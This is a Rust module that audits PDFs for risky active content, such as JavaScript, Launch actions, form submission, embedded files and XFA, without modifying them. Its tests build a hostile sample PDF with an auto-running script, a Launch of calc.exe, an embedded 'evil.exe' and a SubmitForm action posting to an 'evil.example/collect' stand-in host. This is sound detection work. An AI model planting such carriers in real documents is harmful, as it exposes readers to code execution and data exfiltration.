//! Read-only inventory of risky active content in a PDF.
//!
//! This complements [`super::sanitize`]: where sanitize strips active
//! content, this op *reports* it without modifying anything. It walks
//! the same structural carriers — catalog `/OpenAction` and `/AA`, the
//! catalog `/Names` dictionary's name trees (`/JavaScript`,
//! `/EmbeddedFiles`, `/RichMedia`, `/AlternateImages`, `/XFA`),
//! per-page `/AA`, and per-annotation `/A`/`/AA` action tables — plus
//! `/AcroForm` XFA packets, outline-item actions, and catalog
//! `/Perms`.
//!
//! Every action dictionary encountered is classified by its `/S`
//! subtype into a [`RiskKind`]: `/JavaScript` payloads, `/Launch`
//! actions (which start external programs), `/SubmitForm`/`/ImportData`
//! (data exfiltration), `/Rendition`/`/Sound`/`/Movie`/`/RichMedia`
//! (active media), and everything else that can reach outside the
//! document (`/URI`, `/GoToR`, `/GoToE`, `/Named`, unknown subtypes) as
//! [`RiskKind::Other`]. Benign internal navigation actions (`/GoTo`,
//! `/GoToPage`, `/Hide`, page-turn actions, `/SetOCGState`) are not
//! reported.
//!
//! Like [`super::inspect_javascript`], this tolerates encrypted input:
//! structure is still inventoried and undecodable strings degrade to
//! empty detail text, with a warning recorded in
//! [`ContentAudit::warnings`]. Nothing is executed or removed — this is
//! a structural inventory only.
//!
//! Honest limits: coverage matches sanitize's — spec-conformant
//! locations only. JavaScript cannot hide inside page content streams,
//! but `/Named` actions resolving indirectly through the
//! `/JavaScript` name tree, XFA packets referenced from form fields
//! other than the catalog `/AcroForm`, and embedded-file *contents*
//! (only their presence is reported) are out of scope.

use lopdf::{Document, Object, decode_text_string};

use serde::{Deserialize, Serialize};

use crate::crates::core::engine::EngineLimits;

use crate::crates::pdf_engine::error::PdfResult;

use super::load::{doc_is_encrypted, load_pdf};

/// Maximum length of a decoded detail string (JS payload, filename,
/// URI) reported on a [`ContentRisk`].
const MAX_DETAIL_CHARS: usize = 300;

/// Classification of one piece of risky content found in the document.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize)]
pub enum RiskKind {
    /// A `/JavaScript` action or `/Names/JavaScript` name-tree entry.
    JavaScript,
    /// A `/Launch` action — runs an external application or document.
    LaunchAction,
    /// An embedded-file payload: `/Names/EmbeddedFiles` entries.
    EmbeddedFile,
    /// Active media: `/RichMedia`, `/Rendition`, `/Sound`, `/Movie`
    /// actions and the `/Names/RichMedia` name tree.
    RichMedia,
    /// Form-data movement: `/SubmitForm` or `/ImportData` actions, and
    /// XFA form packets (`/AcroForm /XFA`, `/Names/XFA`).
    SubmitForm,
    /// XFA form packets — XML Forms Architecture replaces the AcroForm
    /// field model and is a known attack surface.
    XFA,
    /// Anything else that can reach outside the document or is
    /// noteworthy: `/URI`, `/GoToR`, `/GoToE`, `/Named`, unknown action
    /// subtypes, catalog `/Perms`.
    Other,
}

/// One piece of risky content found during the audit.
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct ContentRisk {
    /// 1-based page number when the risk is anchored to a page
    /// (annotation or page `/AA`); `None` for document-level carriers.
    pub page: Option<u32>,
    /// Human-readable structural location, e.g.
    /// `"catalog /OpenAction"`, `"page 2 /Annots[0] /A"`,
    /// `"names /EmbeddedFiles"`.
    pub location: String,
    /// Risk classification.
    pub kind: RiskKind,
    /// Short human-readable detail: the decoded `/JS` snippet, launch
    /// `/F` filename, `/URI` target, or entry count. Empty when nothing
    /// useful could be decoded.
    pub detail: String,
}

/// Result of [`audit_content`].
#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
pub struct ContentAudit {
    /// Every risk found, in scan order (catalog, names trees, pages,
    /// outline).
    pub risks: Vec<ContentRisk>,
    /// Number of pages the audit walked (`doc.get_pages().len()`).
    pub pages_scanned: usize,
    /// Non-fatal notes: encrypted input, unreadable substructures, etc.
    pub warnings: Vec<String>,
}

/// Scan `input` for risky active content; returns a read-only
/// [`ContentAudit`].
///
/// Input-side limits (`max_input_bytes`, `max_pages`) are enforced by
/// [`load_pdf`]. Encrypted documents are tolerated — a warning is
/// recorded and undecodable strings degrade to empty details.
pub fn audit_content(input: &[u8], limits: &EngineLimits) -> PdfResult<ContentAudit> {
    let doc = load_pdf(input, limits)?;

    let mut risks = Vec::new();
    let mut warnings = Vec::new();
    if doc_is_encrypted(&doc) {
        warnings.push(
            "document is encrypted; structure was inventoried but string \
             payloads may not decode"
                .to_string(),
        );
    }

    let pages_scanned = doc.get_pages().len();
    // A password-protected document loads with its trailer but no
    // objects: lopdf refuses to parse ciphertext without the key, so the
    // page tree is unreachable. Page dictionaries themselves are not
    // encrypted (only strings and streams are), so the count can still
    // be recovered by scanning the raw bytes for `/Type /Page` pairs —
    // reported as an estimate, never as walked pages.
    let mut pages_scanned = pages_scanned;
    if pages_scanned == 0 && doc_is_encrypted(&doc) {
        pages_scanned = count_page_dicts_raw(input);
        if pages_scanned > 0 {
            warnings.push(
                "document is encrypted and requires a password; objects could \
                 not be loaded, so the page count is a raw-structure estimate \
                 and no risks could be inventoried"
                    .to_string(),
            );
        }
    }

    scan_catalog(&doc, &mut risks);
    scan_acroform(&doc, &mut risks);
    scan_names_trees(&doc, &mut risks, &mut warnings);
    scan_pages(&doc, &mut risks);
    scan_outline(&doc, &mut risks);

    Ok(ContentAudit {
        risks,
        pages_scanned,
        warnings,
    })
}

/// Resolve one level of indirection: `Object::Reference` → the target
/// object via `Document::dereference`. Non-references pass through.
/// Returns `None` for dangling references.
fn resolve<'a>(doc: &'a Document, obj: &'a Object) -> Option<&'a Object> {
    match obj {
        Object::Reference(_) => doc.dereference(obj).ok().map(|(_, o)| o),
        _ => Some(obj),
    }
}

/// Resolve `obj` to a dictionary if possible.
fn as_dict<'a>(doc: &'a Document, obj: &'a Object) -> Option<&'a lopdf::Dictionary> {
    resolve(doc, obj)?.as_dict().ok()
}

/// Decode a PDF string object to a `String`. Returns `None` for
/// non-strings and undecodable payloads (e.g. encrypted bytes).
fn decode_string(doc: &Document, obj: &Object) -> Option<String> {
    let resolved = resolve(doc, obj)?;
    decode_text_string(resolved).ok()
}

/// Truncate `s` to [`MAX_DETAIL_CHARS`] characters (char-boundary safe).
fn truncate(s: &str) -> String {
    s.chars().take(MAX_DETAIL_CHARS).collect()
}

/// Action subtypes that stay inside the document and are therefore not
/// reported: plain internal navigation. Everything else that appears as
/// an action `/S` subtype is reported (classified by
/// [`classify_action`]).
const BENIGN_ACTIONS: &[&[u8]] = &[
    b"GoTo",
    b"GoToPage",
    b"Hide",
    b"NextPage",
    b"PrevPage",
    b"FirstPage",
    b"LastPage",
    b"SetOCGState",
];

/// Map an action `/S` subtype to its [`RiskKind`], or `None` when the
/// subtype is benign internal navigation.
fn classify_action(subtype: &[u8]) -> Option<RiskKind> {
    if BENIGN_ACTIONS.contains(&subtype) {
        return None;
    }
    Some(match subtype {
        b"JavaScript" => RiskKind::JavaScript,
        b"Launch" => RiskKind::LaunchAction,
        b"SubmitForm" | b"ImportData" => RiskKind::SubmitForm,
        b"RichMedia" | b"Rendition" | b"Sound" | b"Movie" => RiskKind::RichMedia,
        _ => RiskKind::Other,
    })
}

/// Build a short detail string for an action dictionary: the decoded
/// payload relevant to its subtype (`/JS`, `/F`, `/URI`, `/D` target).
fn action_detail(doc: &Document, dict: &lopdf::Dictionary) -> String {
    let keys: &[&[u8]] = match dict
        .get(b"S")
        .ok()
        .and_then(|s| resolve(doc, s))
        .and_then(|o| o.as_name().ok())
    {
        Some(b"JavaScript") => &[b"JS"],
        Some(b"Launch") | Some(b"SubmitForm") | Some(b"ImportData") | Some(b"GoToR")
        | Some(b"GoToE") => &[b"F"],
        Some(b"URI") => &[b"URI"],
        _ => &[],
    };
    for key in keys {
        if let Ok(value) = dict.get(key)
            && let Some(text) = decode_string(doc, value)
            && !text.is_empty()
        {
            return truncate(&text);
        }
    }
    // Fall back to the subtype name so the risk is never bare.
    dict.get(b"S")
        .ok()
        .and_then(|s| resolve(doc, s))
        .and_then(|o| o.as_name().ok())
        .map(|name| String::from_utf8_lossy(name).into_owned())
        .unwrap_or_default()
}

/// If `action_obj` (resolved) is an action dictionary with a risky
/// `/S` subtype, push a [`ContentRisk`] at `location` with `page`.
fn report_action(
    doc: &Document,
    action_obj: &Object,
    page: Option<u32>,
    location: &str,
    risks: &mut Vec<ContentRisk>,
) {
    let Some(dict) = as_dict(doc, action_obj) else {
        return;
    };
    let Some(subtype) = dict
        .get(b"S")
        .ok()
        .and_then(|s| resolve(doc, s))
        .and_then(|o| o.as_name().ok())
    else {
        return;
    };
    let Some(kind) = classify_action(subtype) else {
        return;
    };
    risks.push(ContentRisk {
        page,
        location: location.to_string(),
        kind,
        detail: action_detail(doc, dict),
    });
}

/// Iterate every action inside an `/A`-style value: a single action
/// dictionary, an array of action dictionaries, or a reference to
/// either. Array members get an index suffix in the location.
fn report_actions(
    doc: &Document,
    value: &Object,
    page: Option<u32>,
    location: &str,
    risks: &mut Vec<ContentRisk>,
) {
    let Some(resolved) = resolve(doc, value) else {
        return;
    };
    match resolved {
        Object::Array(items) => {
            for (i, item) in items.iter().enumerate() {
                report_action(doc, item, page, &format!("{location}[{i}]"), risks);
            }
        }
        _ => report_action(doc, resolved, page, location, risks),
    }
}

/// Scan every value of an `/AA` additional-actions dictionary owned by
/// the object at `owner`: each key (`/WC`, `/WS`, `/E`, ...) maps to an
/// action or an array of actions.
fn report_aa_table(
    doc: &Document,
    owner: &Object,
    page: Option<u32>,
    location: &str,
    risks: &mut Vec<ContentRisk>,
) {
    let Some(aa_dict) = as_dict(doc, owner)
        .and_then(|d| d.get(b"AA").ok())
        .and_then(|o| as_dict(doc, o))
    else {
        return;
    };
    for (key, value) in aa_dict.iter() {
        let key_str = String::from_utf8_lossy(key);
        report_actions(
            doc,
            value,
            page,
            &format!("{location} /AA /{key_str}"),
            risks,
        );
    }
}

/// Catalog-level carriers: `/OpenAction`, `/AA`, `/Perms`.
fn scan_catalog(doc: &Document, risks: &mut Vec<ContentRisk>) {
    let Ok(root) = doc.trailer.get(b"Root").and_then(Object::as_reference) else {
        return;
    };
    let Ok(catalog_obj) = doc.get_object(root) else {
        return;
    };
    let Ok(catalog) = catalog_obj.as_dict() else {
        return;
    };

    if let Ok(open_action) = catalog.get(b"OpenAction") {
        report_actions(doc, open_action, None, "catalog /OpenAction", risks);
    }
    report_aa_table(doc, catalog_obj, None, "catalog", risks);

    // /Perms holds usage-rights / signature permission dictionaries;
    // noteworthy enough to surface as Other.
    if catalog.get(b"Perms").is_ok() {
        risks.push(ContentRisk {
            page: None,
            location: "catalog /Perms".to_string(),
            kind: RiskKind::Other,
            detail: "document permissions dictionary present".to_string(),
        });
    }
}

/// AcroForm carrier: `/XFA` packet array replaces the field model.
fn scan_acroform(doc: &Document, risks: &mut Vec<ContentRisk>) {
    let Ok(root) = doc.trailer.get(b"Root").and_then(Object::as_reference) else {
        return;
    };
    let Ok(catalog_obj) = doc.get_object(root) else {
        return;
    };
    let Ok(acroform_obj) = catalog_obj
        .as_dict()
        .and_then(|d| d.get(b"AcroForm").map(|o| o.clone()))
    else {
        return;
    };
    let Some(acroform) = as_dict(doc, &acroform_obj) else {
        return;
    };
    if acroform.get(b"XFA").is_ok() {
        let detail = acroform
            .get(b"XFA")
            .ok()
            .and_then(|x| resolve(doc, x))
            .and_then(|o| o.as_array().ok())
            .map(|items| format!("{} XFA packet(s)", items.len()))
            .unwrap_or_else(|| "XFA packet array present".to_string());
        risks.push(ContentRisk {
            page: None,
            location: "catalog /AcroForm /XFA".to_string(),
            kind: RiskKind::XFA,
            detail,
        });
    }
}

/// Name-tree categories under catalog `/Names` and the [`RiskKind`]
/// used for a bare presence entry. `/JavaScript` is handled
/// per-entry instead (see [`scan_js_name_tree`]).
const NAME_TREE_KINDS: &[(&[u8], &str, RiskKind)] = &[
    (b"EmbeddedFiles", "embedded files", RiskKind::EmbeddedFile),
    (b"RichMedia", "rich media", RiskKind::RichMedia),
    (b"AlternateImages", "alternate images", RiskKind::Other),
    (b"XFA", "XFA templates", RiskKind::XFA),
];

/// Catalog `/Names` → `/JavaScript` name tree: report each named
/// JavaScript action binding.
fn scan_js_name_tree(doc: &Document, tree: &Object, risks: &mut Vec<ContentRisk>) {
    let Some(tree_dict) = as_dict(doc, tree) else {
        return;
    };
    let Some(names) = tree_dict.get(b"Names").ok().and_then(|o| resolve(doc, o)) else {
        return;
    };
    let Some(items) = names.as_array().ok() else {
        return;
    };
    // /Names is a flat [key, value, key, value, ...] array.
    for pair in items.chunks_exact(2) {
        let (key_obj, value_obj) = (&pair[0], &pair[1]);
        // Only inspect values that look like actions.
        let Some(dict) = as_dict(doc, value_obj) else {
            continue;
        };
        if dict.get(b"S").is_err() {
            continue;
        }
        let name = decode_string(doc, key_obj).unwrap_or_default();
        let location = if name.is_empty() {
            "names /JavaScript".to_string()
        } else {
            format!("names /JavaScript '{name}'")
        };
        // Force JavaScript classification for the name tree even if the
        // /S subtype is missing/misleading — the tree itself is the
        // carrier.
        let is_js = dict
            .get(b"S")
            .ok()
            .and_then(|s| resolve(doc, s))
            .and_then(|o| o.as_name().ok())
            == Some(b"JavaScript");
        if !is_js {
            // A non-JavaScript action hiding in the JS name tree is
            // still suspicious; report under its own classification.
            report_action(doc, value_obj, None, &location, risks);
            continue;
        }
        risks.push(ContentRisk {
            page: None,
            location,
            kind: RiskKind::JavaScript,
            detail: dict
                .get(b"JS")
                .ok()
                .and_then(|js| decode_string(doc, js))
                .map(|s| truncate(&s))
                .unwrap_or_default(),
        });
    }
}

/// PDF whitespace bytes (white-space character set, PDF 32000-1 §7.2.2).
fn is_pdf_white(b: u8) -> bool {
    matches!(b, 0 | 9 | 10 | 12 | 13 | 32)
}

/// Bytes that may delimit a name token: whitespace plus the structural
/// delimiters. Used to prove `/Page` is a complete name (not the prefix
/// of `/Pages`, `/PageMode`, ...) and that a candidate `/Type` is a
/// complete key.
fn is_pdf_delimiter(b: u8) -> bool {
    is_pdf_white(b)
        || matches!(
            b,
            b'/' | b'<' | b'>' | b'[' | b']' | b'(' | b')' | b'{' | b'}'
        )
}

/// Best-effort page count for encrypted documents whose objects lopdf
/// could not load: count `/Type` → `/Page` name pairs in the raw bytes.
///
/// Encryption protects strings and streams, not dictionaries, so page
/// dictionaries remain visible as plaintext `<< /Type /Page ... >>`.
/// The `/Page` must be a complete name token (rejecting `/Pages` and
/// friends) and a `/Type` key must precede it with only whitespace in
/// between (`/Type/Page` adjacency is legal PDF). Stream payloads are
/// ciphertext in an encrypted document and cannot produce false hits;
/// pages packed inside *encrypted* object streams are invisible to this
/// scan and simply go uncounted — the caller reports the number as an
/// estimate alongside a warning.
fn count_page_dicts_raw(input: &[u8]) -> usize {
    let mut count = 0usize;
    let mut i = 0usize;
    while i + 5 <= input.len() {
        if &input[i..i + 5] == b"/Page" {
            let end_ok = i + 5 >= input.len() || is_pdf_delimiter(input[i + 5]);
            if end_ok {
                // The value of a `/Type` key is this `/Page` name only
                // when nothing but whitespace separates the two tokens.
                // Look back a bounded window for the nearest `/Type`.
                let window_start = i.saturating_sub(48);
                let mut j = i;
                let mut typed = false;
                while j > window_start {
                    j -= 1;
                    if j + 5 <= i
                        && &input[j..j + 5] == b"/Type"
                        && is_pdf_delimiter(input[j + 5])
                        && input[j + 5..i].iter().all(|&b| is_pdf_white(b))
                    {
                        typed = true;
                        break;
                    }
                }
                if typed {
                    count += 1;
                }
            }
        }
        i += 1;
    }
    count
}

/// Count leaf entries in a name tree, following `/Kids` nodes. A
/// visited-set guards against cyclic trees in hostile files.
fn count_name_entries(
    doc: &Document,
    tree: &Object,
    visited: &mut std::collections::HashSet<lopdf::ObjectId>,
) -> usize {
    let Some(tree_dict) = as_dict(doc, tree) else {
        return 0;
    };
    // Guard cycles on indirect tree nodes.
    if let Object::Reference(id) = tree {
        if !visited.insert(*id) {
            return 0;
        }
    }
    let mut count = tree_dict
        .get(b"Names")
        .ok()
        .and_then(|o| resolve(doc, o))
        .and_then(|o| o.as_array().ok())
        .map(|items| items.len() / 2)
        .unwrap_or(0);
    if let Ok(kids) = tree_dict.get(b"Kids")
        && let Some(kids_arr) = resolve(doc, kids).and_then(|o| o.as_array().ok())
    {
        for kid in kids_arr {
            count += count_name_entries(doc, kid, visited);
        }
    }
    count
}

/// Catalog `/Names` dictionary: per-category trees.
fn scan_names_trees(doc: &Document, risks: &mut Vec<ContentRisk>, warnings: &mut Vec<String>) {
    let Ok(root) = doc.trailer.get(b"Root").and_then(Object::as_reference) else {
        return;
    };
    let Ok(catalog_obj) = doc.get_object(root) else {
        return;
    };
    let Ok(names_obj) = catalog_obj
        .as_dict()
        .and_then(|d| d.get(b"Names").map(|o| o.clone()))
    else {
        return;
    };
    let Some(names_dict) = as_dict(doc, &names_obj) else {
        warnings.push("catalog /Names is not a readable dictionary".to_string());
        return;
    };

    // JavaScript name tree: per-entry reports.
    if let Ok(js_tree) = names_dict.get(b"JavaScript") {
        scan_js_name_tree(doc, js_tree, risks);
    }

    // Other risky categories: one summary risk per tree, with the
    // entry count (kids followed) as detail.
    for (key, label, kind) in NAME_TREE_KINDS {
        if let Ok(tree) = names_dict.get(key) {
            let mut visited = std::collections::HashSet::new();
            let count = count_name_entries(doc, tree, &mut visited);
            risks.push(ContentRisk {
                page: None,
                location: format!("names /{}", String::from_utf8_lossy(key)),
                kind: *kind,
                detail: format!(
                    "{count} {label} name entr{}",
                    if count == 1 { "y" } else { "ies" }
                ),
            });
        }
    }
}

/// Every page's `/AA` plus each annotation's `/AA` and `/A`.
fn scan_pages(doc: &Document, risks: &mut Vec<ContentRisk>) {
    for (page_num, page_id) in doc.get_pages() {
        let Ok(page_obj) = doc.get_object(page_id) else {
            continue;
        };
        report_aa_table(
            doc,
            page_obj,
            Some(page_num),
            &format!("page {page_num}"),
            risks,
        );

        let Some(annots) = page_obj
            .as_dict()
            .ok()
            .and_then(|d| d.get(b"Annots").ok())
            .and_then(|o| resolve(doc, o))
            .and_then(|o| o.as_array().ok())
        else {
            continue;
        };
        for (i, annot_ref) in annots.iter().enumerate() {
            let Some(annot_obj) = resolve(doc, annot_ref) else {
                continue;
            };
            let base = format!("page {page_num} /Annots[{i}]");
            report_aa_table(doc, annot_obj, Some(page_num), &base, risks);
            if let Some(dict) = as_dict(doc, annot_obj)
                && let Ok(action) = dict.get(b"A")
            {
                report_actions(doc, action, Some(page_num), &format!("{base} /A"), risks);
            }
        }
    }
}

/// Walk the outline item tree (`/Outlines` → `/First` → `/Next`/`/First`
/// children) and report each item's `/A` action. A visited-set guards
/// against cyclic `/Next` chains in hostile files.
fn scan_outline(doc: &Document, risks: &mut Vec<ContentRisk>) {
    let Ok(root) = doc.trailer.get(b"Root").and_then(Object::as_reference) else {
        return;
    };
    let Ok(catalog_obj) = doc.get_object(root) else {
        return;
    };
    let Ok(outlines) = catalog_obj.as_dict().and_then(|d| d.get(b"Outlines")) else {
        return;
    };
    // `/First` must be read as a reference *before* any dereference:
    // `resolve` would return the item dictionary itself, which is not a
    // reference and would end the walk before it starts.
    let Some(first) = as_dict(doc, outlines)
        .and_then(|d| d.get(b"First").ok())
        .and_then(|o| o.as_reference().ok())
    else {
        return;
    };

    let mut visited = std::collections::HashSet::new();
    let mut stack = vec![first];
    while let Some(id) = stack.pop() {
        if !visited.insert(id) {
            continue;
        }
        let Ok(item_obj) = doc.get_object(id) else {
            continue;
        };
        let Some(item_dict) = as_dict(doc, item_obj) else {
            continue;
        };

        let title = item_dict
            .get(b"Title")
            .ok()
            .and_then(|t| decode_string(doc, t))
            .unwrap_or_default();
        let base = format!("outline '{title}'");

        if let Ok(action) = item_dict.get(b"A") {
            report_actions(doc, action, None, &format!("{base} /A"), risks);
        }

        if let Ok(child) = item_dict.get(b"First").and_then(|o| o.as_reference()) {
            stack.push(child);
        }
        if let Ok(next) = item_dict.get(b"Next").and_then(|o| o.as_reference()) {
            stack.push(next);
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::crates::pdf_engine::ops::encrypt::{PdfPermissions, encrypt};
    use crate::crates::pdf_engine::ops::test_utils::pdf_with_pages;
    use lopdf::{Document, Object, dictionary};

    /// Build a PDF carrying every scanned risk carrier:
    /// catalog OpenAction (JS) + AA (Launch) + Perms + AcroForm XFA,
    /// Names trees (JavaScript, EmbeddedFiles, RichMedia, AlternateImages,
    /// XFA), a page AA plus an annotation /A (URI) and /AA (SubmitForm),
    /// and an outline item /A (JavaScript).
    fn pdf_with_risks() -> Vec<u8> {
        let mut doc = Document::load_mem(&pdf_with_pages(&["click me"])).unwrap();

        let js = |code: &str| {
            dictionary! {
                "S" => "JavaScript",
                "JS" => Object::string_literal(code),
            }
        };

        let named_js_id = doc.add_object(js("app.alert('named')"));
        let ur3_id = doc.new_object_id();
        let emb_id = doc.new_object_id();

        let root_id = doc.trailer.get(b"Root").unwrap().as_reference().unwrap();
        {
            let catalog = doc.get_dictionary_mut(root_id).unwrap();
            catalog.set("OpenAction", js("app.alert('open')"));
            catalog.set(
                "AA",
                dictionary! { "WC" => dictionary! { "S" => "Launch", "F" => Object::string_literal("calc.exe") } },
            );
            catalog.set("Perms", dictionary! { "UR3" => Object::Reference(ur3_id) });
            catalog.set(
                "AcroForm",
                dictionary! {
                    "Fields" => Object::Array(vec![]),
                    "XFA" => Object::Array(vec![
                        Object::string_literal("preamble"),
                        Object::string_literal("<xdp/>"),
                    ]),
                },
            );
            catalog.set(
                "Names",
                dictionary! {
                    "JavaScript" => dictionary! {
                        "Names" => Object::Array(vec![
                            Object::string_literal("a"),
                            Object::Reference(named_js_id),
                        ]),
                    },
                    "EmbeddedFiles" => dictionary! {
                        "Names" => Object::Array(vec![
                            Object::string_literal("evil.exe"),
                            Object::Reference(emb_id),
                        ]),
                    },
                    "RichMedia" => dictionary! {
                        "Names" => Object::Array(vec![]),
                    },
                    "AlternateImages" => dictionary! {
                        "Names" => Object::Array(vec![]),
                    },
                    "XFA" => dictionary! {
                        "Names" => Object::Array(vec![]),
                    },
                },
            );
        }

        // Page AA + annotation with /A (URI) and /AA (SubmitForm).
        let (_, page_id) = doc
            .get_pages()
            .iter()
            .next()
            .map(|(n, i)| (*n, *i))
            .unwrap();
        {
            let page = doc.get_dictionary_mut(page_id).unwrap();
            page.set("AA", dictionary! { "O" => dictionary! { "S" => "Movie", "F" => Object::string_literal("clip.mov") } });
        }
        let annot_id = doc.add_object(dictionary! {
            "Type" => "Annot",
            "Subtype" => "Link",
            "Rect" => vec![0.into(), 0.into(), 10.into(), 10.into()],
            "A" => dictionary! {
                "S" => "URI",
                "URI" => Object::string_literal("https://evil.example"),
            },
            "AA" => dictionary! {
                "E" => dictionary! {
                    "S" => "SubmitForm",
                    "F" => Object::string_literal("https://evil.example/collect"),
                },
            },
        });
        doc.get_dictionary_mut(page_id)
            .unwrap()
            .set("Annots", Object::Array(vec![Object::Reference(annot_id)]));

        // Outline item with a JavaScript action.
        let outline_id = doc.add_object(dictionary! {
            "Title" => Object::string_literal("bad bookmark"),
            "Parent" => Object::Null,
            "A" => js("app.alert('outline')"),
        });
        doc.get_dictionary_mut(root_id).unwrap().set(
            "Outlines",
            dictionary! {
                "Type" => "Outlines",
                "First" => Object::Reference(outline_id),
                "Last" => Object::Reference(outline_id),
                "Count" => 1,
            },
        );

        let mut buf = Vec::new();
        doc.save_to(&mut buf).unwrap();
        buf
    }

    fn kinds(audit: &ContentAudit) -> Vec<RiskKind> {
        audit.risks.iter().map(|r| r.kind).collect()
    }

    #[test]
    fn audit_finds_every_carrier() {
        let audit = audit_content(&pdf_with_risks(), &EngineLimits::default()).unwrap();
        assert_eq!(audit.pages_scanned, 1);
        assert!(audit.warnings.is_empty());

        let ks = kinds(&audit);
        assert!(ks.contains(&RiskKind::JavaScript), "{ks:?}");
        assert!(ks.contains(&RiskKind::LaunchAction), "{ks:?}");
        assert!(ks.contains(&RiskKind::EmbeddedFile), "{ks:?}");
        assert!(ks.contains(&RiskKind::RichMedia), "{ks:?}");
        assert!(ks.contains(&RiskKind::SubmitForm), "{ks:?}");
        assert!(ks.contains(&RiskKind::XFA), "{ks:?}");
        assert!(ks.contains(&RiskKind::Other), "{ks:?}");

        let locations: Vec<&str> = audit.risks.iter().map(|r| r.location.as_str()).collect();
        assert!(locations.contains(&"catalog /OpenAction"), "{locations:?}");
        assert!(
            locations.iter().any(|l| l.starts_with("catalog /AA /WC")),
            "{locations:?}"
        );
        assert!(locations.contains(&"catalog /Perms"), "{locations:?}");
        assert!(
            locations.contains(&"catalog /AcroForm /XFA"),
            "{locations:?}"
        );
        assert!(
            locations.iter().any(|l| l.contains("/JavaScript 'a'")),
            "{locations:?}"
        );
        assert!(locations.contains(&"names /EmbeddedFiles"), "{locations:?}");
        assert!(locations.contains(&"names /RichMedia"), "{locations:?}");
        assert!(
            locations.contains(&"names /AlternateImages"),
            "{locations:?}"
        );
        assert!(locations.contains(&"names /XFA"), "{locations:?}");
        assert!(
            locations.iter().any(|l| l.starts_with("page 1 /AA /O")),
            "{locations:?}"
        );
        assert!(
            locations.iter().any(|l| l.contains("/Annots[0] /A")),
            "{locations:?}"
        );
        assert!(
            locations.iter().any(|l| l.contains("/Annots[0] /AA /E")),
            "{locations:?}"
        );
        assert!(
            locations
                .iter()
                .any(|l| l.contains("outline 'bad bookmark' /A")),
            "{locations:?}"
        );

        // Page-anchored risks carry the page number.
        // `/Annots[0] /AA /E` also contains the substring
        // `/Annots[0] /A`, so match the `/A` location exactly.
        let annot_risk = audit
            .risks
            .iter()
            .find(|r| r.location.ends_with("/Annots[0] /A"))
            .unwrap();
        assert_eq!(annot_risk.page, Some(1));
        assert_eq!(annot_risk.kind, RiskKind::Other); // URI action
        assert!(annot_risk.detail.contains("evil.example"));

        // Launch detail carries the filename; JS detail carries code.
        let launch = audit
            .risks
            .iter()
            .find(|r| r.kind == RiskKind::LaunchAction)
            .unwrap();
        assert!(launch.detail.contains("calc.exe"));
        let js = audit
            .risks
            .iter()
            .find(|r| r.location == "catalog /OpenAction")
            .unwrap();
        assert_eq!(js.kind, RiskKind::JavaScript);
        assert!(js.detail.contains("app.alert('open')"));
    }

    #[test]
    fn audit_clean_pdf_reports_nothing() {
        let audit = audit_content(&pdf_with_pages(&["hello"]), &EngineLimits::default()).unwrap();
        assert!(audit.risks.is_empty());
        assert_eq!(audit.pages_scanned, 1);
        assert!(audit.warnings.is_empty());
    }

    #[test]
    fn benign_actions_not_reported() {
        let mut doc = Document::load_mem(&pdf_with_pages(&["x"])).unwrap();
        let (_, page_id) = doc
            .get_pages()
            .iter()
            .next()
            .map(|(n, i)| (*n, *i))
            .unwrap();
        let annot_id = doc.add_object(dictionary! {
            "Type" => "Annot",
            "Subtype" => "Link",
            "Rect" => vec![0.into(), 0.into(), 10.into(), 10.into()],
            "A" => dictionary! {
                "S" => "GoTo",
                "D" => vec![1.into(), "Fit".into()],
            },
        });
        doc.get_dictionary_mut(page_id)
            .unwrap()
            .set("Annots", Object::Array(vec![Object::Reference(annot_id)]));
        let mut buf = Vec::new();
        doc.save_to(&mut buf).unwrap();

        let audit = audit_content(&buf, &EngineLimits::default()).unwrap();
        assert!(audit.risks.is_empty());
    }

    #[test]
    fn action_arrays_reported() {
        // /A holding an array of actions: both members are audited.
        let mut doc = Document::load_mem(&pdf_with_pages(&["x"])).unwrap();
        let (_, page_id) = doc
            .get_pages()
            .iter()
            .next()
            .map(|(n, i)| (*n, *i))
            .unwrap();
        let annot_id = doc.add_object(dictionary! {
            "Type" => "Annot",
            "Subtype" => "Link",
            "Rect" => vec![0.into(), 0.into(), 10.into(), 10.into()],
            "A" => Object::Array(vec![
                Object::Dictionary(dictionary! {
                    "S" => "GoTo",
                    "D" => vec![1.into(), "Fit".into()],
                }),
                Object::Dictionary(dictionary! {
                    "S" => "Sound",
                    "F" => Object::string_literal("beep.wav"),
                }),
            ]),
        });
        doc.get_dictionary_mut(page_id)
            .unwrap()
            .set("Annots", Object::Array(vec![Object::Reference(annot_id)]));
        let mut buf = Vec::new();
        doc.save_to(&mut buf).unwrap();

        let audit = audit_content(&buf, &EngineLimits::default()).unwrap();
        assert_eq!(audit.risks.len(), 1);
        assert_eq!(audit.risks[0].kind, RiskKind::RichMedia);
        assert!(audit.risks[0].location.ends_with("/A[1]"));
    }

    #[test]
    fn rejects_garbage() {
        assert!(audit_content(b"junk", &EngineLimits::default()).is_err());
    }

    #[test]
    fn encrypted_input_tolerated_with_warning() {
        let plain = pdf_with_pages(&["x"]);
        let encrypted = encrypt(
            &plain,
            "pw",
            None,
            PdfPermissions::default(),
            &EngineLimits::default(),
        )
        .unwrap();
        let audit = audit_content(&encrypted, &EngineLimits::default()).unwrap();
        assert_eq!(audit.pages_scanned, 1);
        assert!(
            audit.warnings.iter().any(|w| w.contains("encrypted")),
            "{:?}",
            audit.warnings
        );
    }
}
